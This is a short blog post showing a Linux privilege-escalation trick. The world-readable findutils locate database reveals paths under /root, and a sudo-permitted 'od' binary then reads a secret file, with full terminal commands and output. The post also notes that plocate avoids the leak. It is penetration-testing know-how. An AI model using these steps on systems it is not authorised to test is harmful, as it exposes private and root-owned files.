---
layout: post
title: "Leaking file paths with findutils locate"
---

Say you are trying to escalate privileges on a linux box. You've found out that one of the binaries you are allowed to run as sudo enables you to read arbitrary files.

<div class="language-plaintext highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code>lowpriv@ubuntubox:~$ <span class="ow">sudo -l</span>
Matching Defaults entries for lowpriv on ubuntubox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User lowpriv may run the following commands on ubuntubox:
    <span class="mi">(root) NOPASSWD: /usr/bin/od</span>
</code></pre></div></div>

You poke around, try to guess some paths for potentially interesting files, but you find nothing of use.

In this situation `locate` from `findutils` may come in handy if present on the box. The default db file of this version of `locate` is world readable and may disclose paths for files that your user has no access to.


<div class="language-plaintext highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code>lowpriv@ubuntubox:~$ <span class="ow">ls -la /var/cache/locate/locatedb</span>
-rw-r--r-- 1 root root 1208122 Dec  5 21:37 /var/cache/locate/locatedb
lowpriv@ubuntubox:~$ <span class="ow">locate -r '^/root/'</span>
/root/.bash_history
/root/.bashrc
/root/.profile
/root/.viminfo
/root/stuff
<span class="mi">/root/stuff/secret.txt</span>
lowpriv@ubuntubox:~$ <span class="c"># now use `od` to read secret.txt</span>
lowpriv@ubuntubox:~$ <span class="ow">printf "$(sudo od -An -c -w9999 /root/stuff/secret.txt  | sed 's/   //g')"</span>
Secret stuff...  
More secret stuff...
</code></pre></div></div>

Interestingly, `plocate` does not have this problem. The db file is not world-readable, and the command output seems to be filtered based on user permissions.

<div class="language-plaintext highlighter-rouge">
<div class="highlight">
<pre class="highlight">
<code>lowpriv@ubuntubox:~$ <span class="ow">ls -la /var/lib/plocate/plocate.db</span>
-rw-r----- 1 root plocate 2270301 Dec  6 21:37 /var/lib/plocate/plocate.db
lowpriv@ubuntubox:~$ <span class="ow">/usr/bin/plocate -r '^/root'</span>
/root
</code></pre></div></div>

